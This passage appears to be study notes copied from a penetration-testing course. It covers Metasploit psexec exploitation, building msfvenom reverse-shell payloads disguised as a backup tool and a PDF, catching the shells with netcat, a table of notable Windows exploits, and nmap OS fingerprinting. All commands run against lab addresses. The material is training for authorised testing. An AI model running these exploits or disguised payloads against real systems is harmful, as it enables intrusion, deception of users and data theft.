No     Microsoft Windows Shell LNK Code Execution\n\n```\n\nWe will see a long list of `Matching Modules` associated with our search. Notice the format each module is in. Each module has a number listed on the far left of the table to make selecting the module easier, a `Name`, `Disclosure Date`, `Rank`, `Check` and `Description`.\n\nThe number to the `left` of each potential module is a relative number based on your search that may change as modules are added to Metasploit. Don't expect this number to match every time you perform the search or attempt to use the module.\n\nLet's look at one module, in particular, to understand it within the context of payloads.\n\n`56 exploit/windows/smb/psexec`\n\n|Output|Meaning|\n|---|---|\n|`56`|The number assigned to the module in the table within the context of the search. This number makes it easier to select. We can use the command `use 56` to select the module.|\n|`exploit/`|This defines the type of module. In this case, this is an exploit module. Many exploit modules in MSF include the payload that attempts to establish a shell session.|\n|`windows/`|This defines the platform we are targeting. In this case, we know the target is Windows, so the exploit and payload will be for Windows.|\n|`smb/`|This defines the service for which the payload in the module is written.|\n|`psexec`|This defines the tool that will get uploaded to the target system if it is vulnerable.|\n\nOnce we select the module, we will notice a change in the prompt that gives us the ability to configure the module based on parameters specific to our environment.\n\n#### Option Selection\n\nAutomating Payloads & Delivery with Metasploit\n\n```shell-session\nmsf6 > use 56\n\n[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp\n\nmsf6 exploit(windows/smb/psexec) > \n```\n\nNotice how `exploit` is outside of the parentheses. This can be interpreted as the MSF module type being an exploit, and the specific exploit & payload is written for Windows. The attack vector is `SMB`, and the Meterpreter payload will be delivered using [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). Let's learn more about using this exploit and delivering the payload by using the `options` command.\n\n#### Examining an Exploit's Options\n\nAutomating Payloads & Delivery with Metasploit\n\n```shell-session\nmsf6 exploit(windows/smb/psexec) > options\n\nModule options (exploit/windows/smb/psexec):\n\n   Name                  Current Setting  Required  Description\n   ----                  ---------------  --------  -----------\n   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT                 445              yes       The SMB service port (TCP)\n   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing\n   SERVICE_DISPLAY_NAME                   no        The service display name\n   SERVICE_NAME                           no        The service name\n   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo\n                                                    lder share\n   SMBDomain             .                no        The Windows domain to use for authentication\n   SMBPass                                no        The password for the specified username\n   SMBUser                                no        The username to authenticate as\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n```\n\nThis is one area where Metasploit shines in terms of ease of use. In the output of the module options, we see various options and settings with a description of what each setting means. We will not be using `SERVICE_DESCRIPTION`, `SERVICE_DISPLAY_NAME` and `SERVICE_NAME` in this section. Notice how this particular exploit will use a reverse TCP shell connection utilizing `Meterpreter`. A Meterpreter shell gives us far more functionality than a raw TCP reverse shell, as we established in this module's earlier sections. It is the default payload that is used in Metasploit.\n\nWe will want to use the `set` command to configure the following settings as such:\n\n#### Setting Options\n\nAutomating Payloads & Delivery with Metasploit\n\n```shell-session\n\nmsf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71\nRHOSTS => 10.129.180.71\nmsf6 exploit(windows/smb/psexec) > set SHARE ADMIN$\nSHARE => ADMIN$\nmsf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!\nSMBPass => HTB_@cademy_stdnt!\nmsf6 exploit(windows/smb/psexec) > set SMBUser htb-student\nSMBUser => htb-student\nmsf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222\nLHOST => 10.10.14.222\n```\n\nThese settings will ensure that our payload is delivered to the proper target (`RHOSTS`), uploaded to the default administrative share (`ADMIN$`) utilizing credentials (`SMBPass` & `SMBUser`), then initiate a reverse shell connection with our local host machine (`LHOST`).\n\nThese settings will be specific to the IP address on your attack box and on the target box. As well as with credentials you may gather on an engagement. We can set the LHOST (local host) VPN tunnel IP address or the VPN tunnel interface ID.\n\n#### Exploits Away\n\nAutomating Payloads & Delivery with Metasploit\n\n```shell-session\n\nmsf6 exploit(windows/smb/psexec) > exploit\n\n[*] Started reverse TCP handler on 10.10.14.222:4444 \n[*] 10.129.180.71:445 - Connecting to the server...\n[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...\n[*] 10.129.180.71:445 - Selecting PowerShell target\n[*] 10.129.180.71:445 - Executing the payload...\n[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...\n[*] Sending stage (175174 bytes) to 10.129.180.71\n[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000\n\nmeterpreter > \n```\n\nAfter we issue the `exploit` command, the exploit is run, and there is an attempt to deliver the payload onto the target utilizing the Meterpreter payload. Metasploit reports back each step of this process, as seen in the output. We know this was successful because a `stage` was sent successfully, which established a Meterpreter shell session (`meterpreter >`) and a system-level shell session. Keep in mind that Meterpreter is a payload that uses in-memory DLL injection to stealthfully establish a communication channel between an attack box and a target. The proper credentials and attack vector can give us the ability to upload & download files, execute system commands, run a keylogger, create/start/stop services, manage processes, and more.\n\nIn this case, as detailed in the [Rapid 7 Module Documentation](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/): \"This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the \"psexec\" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description. \"\n\nLike other command language interpreters (Bash, PowerShell, ksh, etc...), Meterpreter shell sessions allow us to issue a set of commands we can use to interact with the target system. We can use the `?` to see a list of commands we can use. We will notice limitations with the Meterpreter shell, so it is good to attempt to use the `shell` command to drop into a system-level shell if we need to work with the complete set of system commands native to our target.\n\n#### Interactive Shell\n\nAutomating Payloads & Delivery with Metasploit\n\n```shell-session\nmeterpreter > shell\nProcess 604 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.18362.1256]\n(c) 2019 Microsoft Corporation. All rights reserved.\n\nC:\\WINDOWS\\system32>\n```\n\n`Now let's put our knowledge to the test with some challenge questions`.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/09-Crafting Payloads with MSFvenom",
    "path": "02_CPTS/07-Shells & Payloads/09-Crafting Payloads with MSFvenom.md",
    "title": "09 Crafting Payloads With MSFvenom",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- We must be mindful that using automated attacks in Metasploit requires us to reach a vulnerable target machine over the network. Consider what we did in the last section. To run the exploit module...",
    "category": "02_CPTS",
    "content": "\n---\n\nWe must be mindful that using automated attacks in Metasploit requires us to reach a vulnerable target machine over the network. Consider what we did in the last section. To `run the exploit module`, `deliver the payload`, and `establish the shell session`, we needed to communicate with the system in the first place. This may have been possible through having a presence on the internal network or a network that has routes into the network where the target resides. There will be situations where we do not have direct network access to a vulnerable target machine. In these cases, we will need to get crafty in how the payload gets delivered and executed on the system. One such way may be to use `MSFvenom` to craft a payload and send it via email message or other means of social engineering to drive that user to execute the file.\n\nIn addition to providing a payload with flexible delivery options, MSFvenom also allows us to `encrypt` & `encode` payloads to bypass common anti-virus detection signatures. Let's practice a bit with these concepts.\n\n---\n\n## Practicing with MSFvenom\n\nIn Pwnbox or any host with MSFvenom installed, we can issue the command `msfvenom -l payloads` to list all the available payloads. Below are just some of the payloads available. A few payloads have been redacted to shorten the output and not distract from the core lesson. Take a close look at the payloads and their descriptions:\n\n#### List Payloads\n\nCrafting Payloads with MSFvenom\n\n```shell-session\ndrxh3kr@htb[/htb]$ msfvenom -l payloads\n\nFramework Payloads (592 total) [--payload <value>]\n==================================================\n\n    Name                                                Description\n    ----                                                -----------\nlinux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker\nlinux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker\nlinux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker\nlinux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell\nlinux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell\nlinux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.\nlinux/x86/shell_find_port                           Spawn a shell on an established connection\nlinux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)\nlinux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nlinux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6\nlinux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)\nlinux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)\nlinux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)\nmainframe/shell_reverse_tcp                         Listen for a connection and spawn a  command shell. This implementation does not include ebcdic character translation, so a client wi\n                                                        th translation capabilities is required. MSF handles this automatically.\nmulti/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP\nmulti/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS\nnetware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker\nnodejs/shell_bind_tcp                               Creates an interactive shell via nodejs\nnodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs\nnodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL\nosx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection\nosx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker\nosx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection\nosx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker\nosx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell\nosx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nosx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller\nlibrary has been loaded. Based on work by Charlie Miller\n\nwindows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)\nwindows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)\nwindows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)\nwindows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)\nwindows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection\nwindows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)\nwindows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection\nwindows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop\n                                                        /hop.php to the PHP server you wish to use as a hop.\nwindows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)\nwindows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP\nwindows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6\nwindows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)\nwindows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support\nwindows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)\n\t\n```\n\n`What do you notice about the output?`\n\nWe can see a few details that will help us understand payloads further. First of all, we can see that the payload naming convention almost always starts by listing the OS of the target (`Linux`, `Windows`, `MacOS`, `mainframe`, etc...). We can also see that some payloads are described as (`staged`) or (`stageless`). Let's cover the difference.\n\n---\n\n## Staged vs. Stageless Payloads\n\n`Staged` payloads create a way for us to send over more components of our attack. We can think of it like we are \"setting the stage\" for something even more useful. Take for example this payload `linux/x86/shell/reverse_tcp`. When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload.\n\n`Stageless` payloads do not have a stage. Take for example this payload `linux/zarch/meterpreter_reverse_tcp`. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on [stageless Meterpreter payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).\n\nNow that we understand the differences between a staged and stageless payload, we can identify them within Metasploit. The answer is simple. The `name` will give you your first marker. Take our examples from above, `linux/x86/shell/reverse_tcp` is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So `/shell/` is a stage to send, and `/reverse_tcp` is another. This will look like it is all pressed together for a stageless payload. Take our example `linux/zarch/meterpreter_reverse_tcp`. It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function `/meterpreter_reverse_tcp`. For one last quick example of this naming convention, consider these two `windows/meterpreter/reverse_tcp` and `windows/meterpreter_reverse_tcp`. The former is a `Staged` payload. Notice the naming convention separating the stages. The latter is a `Stageless` payload since we see the shell payload and network communication in the same portion of the name. If the name of the payload doesn't appear quite clear to you, it will often detail if the payload is staged or stageless in the description.\n\n---\n\n## Building A Stageless Payload\n\nNow let's build a simple stageless payload with msfvenom and break down the command.\n\n#### Build It\n\nCrafting Payloads with MSFvenom\n\n```shell-session\ndrxh3kr@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf\n\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 74 bytes\nFinal size of elf file: 194 bytes\n```\n\n#### Call MSFvenom\n\nCrafting Payloads with MSFvenom\n\n```shell-session\nmsfvenom\n```\n\nDefines the tool used to make the payload.\n\n#### Creating a Payload\n\nCrafting Payloads with MSFvenom\n\n```shell-session\n-p \n```\n\nThis `option` indicates that msfvenom is creating a payload.\n\n#### Choosing the Payload based on Architecture\n\nCrafting Payloads with MSFvenom\n\n```shell-session\nlinux/x64/shell_reverse_tcp \n```\n\nSpecifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).\n\n#### Address To Connect Back To\n\nCrafting Payloads with MSFvenom\n\n```shell-session\nLHOST=10.10.14.113 LPORT=443 \n```\n\nWhen executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).\n\n#### Format To Generate Payload In\n\nCrafting Payloads with MSFvenom\n\n```shell-session\n-f elf \n```\n\nThe `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).\n\n#### Output\n\nCrafting Payloads with MSFvenom\n\n```shell-session\n> createbackup.elf\n```\n\nCreates the .elf binary and names the file createbackup. We can name this file whatever we want. Ideally, we would call it something inconspicuous and/or something someone would be tempted to download and execute.\n\n---\n\n## Executing a Stageless Payload\n\nAt this point, we have the payload created on our attack box. We would now need to develop a way to get that payload onto the target system. There are countless ways this can be done. Here are just some of the common ways:\n\n- Email message with the file attached.\n- Download link on a website.\n- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).\n- Via flash drive as part of an onsite penetration test.\n\nOnce the file is on that system, it will also need to be executed.\n\nImagine for a moment: the target machine is an Ubuntu box that an IT admin uses to manage network devices (hosting configuration scripts, accessing routers & switches, etc.). We could get them to click the file in an email we sent because they were carelessly using this system as if it was a personal computer or workstation.\n\n#### Ubuntu Payload\n\n![File explorer showing 'createbackup.elf' in the Downloads folder on a Linux system.](https://academy.hackthebox.com/storage/modules/115/ubuntupayload.png)\n\nWe would have a listener ready to catch the connection on the attack box side upon successful execution.\n\n#### NC Connection\n\nCrafting Payloads with MSFvenom\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nc -lvnp 443\n```\n\nWhen the file is executed, we see that we have caught a shell.\n\n#### Connection Established\n\nCrafting Payloads with MSFvenom\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nc -lvnp 443\n\nListening on 0.0.0.0 443\nConnection received on 10.129.138.85 60892\nenv\nPWD=/home/htb-student/Downloads\ncd ..\nls\nDesktop\nDocuments\nDownloads\nMusic\nPictures\nPublic\nTemplates\nVideos\n```\n\nThis same concept can be used to create payloads for various platforms, including Windows.\n\n---\n\n## Building a simple Stageless Payload for a Windows system\n\nWe can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell.\n\n#### Windows Payload\n\nCrafting Payloads with MSFvenom\n\n```shell-session\ndrxh3kr@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 324 bytes\nFinal size of exe file: 73802 bytes\n```\n\nThe command syntax can be broken down in the same way we did above. The only differences, of course, are the `platform` (`Windows`) and format (`.exe`) of the payload.\n\n---\n\n## Executing a Simple Stageless Payload On a Windows System\n\nThis is another situation where we need to be creative in getting this payload delivered to a target system. Without any `encoding` or `encryption`, the payload in this form would almost certainly be detected by Windows Defender AV.\n\n![File explorer showing 'BonusCompensationPlan.pdf' in the Downloads folder on a Windows system.](https://academy.hackthebox.com/storage/modules/115/winpayload.png)\n\nIf the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.\n\nCrafting Payloads with MSFvenom\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nc -lvnp 443\n\nListening on 0.0.0.0 443\nConnection received on 10.129.144.5 49679\nMicrosoft Windows [Version 10.0.18362.1256]\n(c) 2019 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\htb-student\\Downloads>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is DD25-26EB\n\n Directory of C:\\Users\\htb-student\\Downloads\n\n09/23/2021  10:26 AM    <DIR>          .\n09/23/2021  10:26 AM    <DIR>          ..\n09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe\n               1 File(s)         73,802 bytes\n               2 Dir(s)   9,997,516,800 bytes free\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/10-Infiltrating Windows",
    "path": "02_CPTS/07-Shells & Payloads/10-Infiltrating Windows.md",
    "title": "10 Infiltrating Windows",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Since many of us can remember, Microsoft has dominated the home and enterprise markets for computing. In modern days, with the introduction of improved Active Directory features, more interconnect...",
    "category": "02_CPTS",
    "content": "\n---\n\nSince many of us can remember, Microsoft has dominated the home and enterprise markets for computing. In modern days, with the introduction of improved Active Directory features, more interconnectivity with cloud services, Windows subsystem for Linux, and much more, the Microsoft attack surface has grown as well.\n\nFor example, just in the last five years, there have been `3688` reported vulnerabilities just within Microsoft Products, and this number grows daily. This table was derived from [HERE](https://www.cvedetails.com/vendor/26/Microsoft.html)\n\n---\n\n#### Windows Vulnerability Table\n\n![Table showing the number of vulnerabilities and exploits from 1999 to 2021. It includes categories like DoS, Code Execution, Overflow, Memory Corruption, SQL Injection, XSS, Directory Traversal, and more. Each year lists the number of vulnerabilities and exploits, with totals and percentages at the bottom.](https://academy.hackthebox.com/storage/modules/115/window-vulns-table.png)\n\n## Prominent Windows Exploits\n\nOver the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time. Let's discuss those for a minute:\n\n|**Vulnerability**|**Description**|\n|---|---|\n|`MS08-067`|MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.|\n|`Eternal Blue`|MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.|\n|`PrintNightmare`|A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).|\n|`BlueKeep`|CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.|\n|`Sigred`|CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.|\n|`SeriousSam`|CVE 2021-36934 exploits an issue with the way Windows handles permission on the `C:\\Windows\\system32\\config` folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.|\n|`Zerologon`|CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.|\n\nWith these vulnerabilities in mind, Windows isn't going anywhere. We need to be proficient with identifying vulnerabilities, exploiting them, and moving around in Windows hosts and environments. An understanding of these concepts can help us secure our environments from attack as well. Now it's time to dive in and explore some Windows-focused exploit fun.\n\n---\n\n## Enumerating Windows & Fingerprinting Methods\n\nThis module assumes you have already performed your host enumeration phase and understand what services are commonly seen on hosts. We are just attempting to give you a few quick tricks to determine if a host is likely a Windows machine. Check out the [Network Enumeration With NMAP](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap) module for a more detailed look at host enumeration and fingerprinting.\n\nSince we have a set of targets, `what are a few ways to determine if the host is likely a Windows Machine`? To answer this question, we can look at a few things. The first one being the `Time To Live` (TTL) counter when utilizing ICMP to determine if the host is up. A typical response from a Windows host will either be 32 or 128. A response of or around 128 is the most common response you will see. This value may not always be exact, especially if you are not in the same layer three network as the target. We can utilize this value since most hosts will never be more than 20 hops away from your point of origin, so there is little chance of the TTL counter dropping into the acceptable values of another OS type. In the ping output `below`, we can see an example of this. For the example, we pinged a Windows 10 host and can see we have received replies with a TTL of 128. Check out this [link](https://subinsb.com/default-device-ttl-values/) for a nice table showing other TTL values by OS.\n\n#### Pinged Host\n\nInfiltrating Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ ping 192.168.86.39 \n\nPING 192.168.86.39 (192.168.86.39): 56 data bytes\n64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms\n64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms\n64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms\n64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms\n```\n\nAnother way we can validate if the host is Windows or not is to use our handy tool, `NMAP`. Nmap has a cool capability built in to help with OS identification and many other scripted scans to check for anything from a specific vulnerability to information gathered from SNMP. For this example, we will utilize the `-O` option with verbose output `-v` to initialize an OS Identification scan against our target `192.168.86.39`. As we scroll through the shell session below and look at the results, a few things give this away as a Windows host. We will focus on those here in a minute. Look carefully at the bottom of the shell session. We can see the point labeled `OS CPE: cpe:/o:microsoft:windows_10` and `OS details: Microsoft Windows 10 1709 - 1909`. Nmap made this guess based on several different metrics it derives from the TCP/IP stack. It uses those qualities to determine the OS as it checks it against a database of OS fingerprints. In this case, Nmap has determined that our host is a Windows 10 machine with a revision level between 1709 & 1909.\n\nIf you run into issues and the scans turn up little results, attempt again with the `-A` and `-Pn` options. This will perform a different scan and may work. For more info on how this process works, check out this article from the [Nmap Documentation](https://nmap.org/book/man-os-detection.html). Be careful of this detection method. Implementing a firewall or other security features can obscure the host or mess the results up. When possible, use more than one check to make a determination.\n\n#### OS Detection Scan\n\nInfiltrating Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -v -O 192.168.86.39\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT\nInitiating ARP Ping Scan at 17:40\nScanning 192.168.86.39 [1 port]\nCompleted ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 17:40\nCompleted Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed\nInitiating SYN Stealth Scan at 17:40\nScanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports]\nDiscovered open port 139/tcp on 192.168.86.39\nDiscovered open port 135/tcp on 192.168.86.39\nDiscovered open port 443/tcp on 192.168.86.39\nDiscovered open port 445/tcp on 192.168.86.39\nDiscovered open port 902/tcp on 192.168.86.39\nDiscovered open port 912/tcp on 192.168.86.39\nCompleted SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports)\nInitiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39)\nNmap scan report for desktop-jba7h4t.lan (192.168.86.39)\nHost is up (0.010s latency).\nNot shown: 994 closed tcp ports (reset)\nPORT    STATE SERVICE\n135/tcp open  msrpc\n139/tcp open  netbios-ssn\n443/tcp open  https\n445/tcp open  microsoft-ds\n902/tcp open  iss-realsecure\n912/tcp open  apex-mesh\nMAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)\nDevice type: general purpose\nRunning: Microsoft Windows 10\nOS CPE: cpe:/o:microsoft:windows_10\nOS details: Microsoft Windows 10 1709 - 1909\nNetwork Distance: 1 hop\n```\n\nNow that we know we are dealing with a Windows 10 host, we need to enumerate the services we can see to determine if we have a potential avenue of exploitation. To perform banner grabbing, we can use several different tools. Netcat, Nmap, and many others can perform the enumeration we need, but for this instance, we will look at a simple Nmap script called `banner.nse`. For each port Nmap sees as up, it will attempt to connect to the port and glean any information it can from it. In the session below, Nmap tried to connect to each port, but the only ports to give back a response were ports 902 and 912. Based on the page banner, they have something to do with VMWare Workstation. We can attempt to find an exploit dealing with that protocol, or we can further enumerate the other ports. In a real pentest, you will want to be as thorough as possible, making sure you have the full lay of the land.\n\n#### Banner Grab to Enumerate Ports\n\nInfiltrating Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT\nNSE: Loaded 1 scripts for scanning.\n<snip>\nDiscovered open port 135/tcp on 192.168.86.39\nDiscovered open port 139/tcp on 192.168.86.39\nDiscovered open port 445/tcp on 192.168.86.39\nDiscovered open port 443/tcp on 192.168.86.39\nDiscovered open port 912/tcp on 192.168.86.39\nDiscovered open port 902/tcp on 192.168.86.39\nCompleted SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)\nNSE: Script scanning 192.168.86.39.\nInitiating NSE at 18:01\nCompleted NSE at 18:01, 20.11s elapsed\nNmap scan report for desktop-jba7h4t.lan (192.168.86.39)\nHost is up (0.012s latency).\nNot shown: 994 closed tcp ports (reset)\nPORT    STATE SERVICE\n135/tcp open  msrpc\n139/tcp open  netbios-ssn\n443/tcp open  https\n445/tcp open  microsoft-ds\n902/tcp open  iss-realsecure\n| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se\n|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t\n912/tcp open  apex-mesh\n| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto\n|_col:SOAP, MKSDisplayProtocol:VNC , ,\nMAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)\n```\n\nThe examples shown above are just a few ways to help fingerprint and determine if a host is a Windows machine. It is by no means an exhaustive list, and there 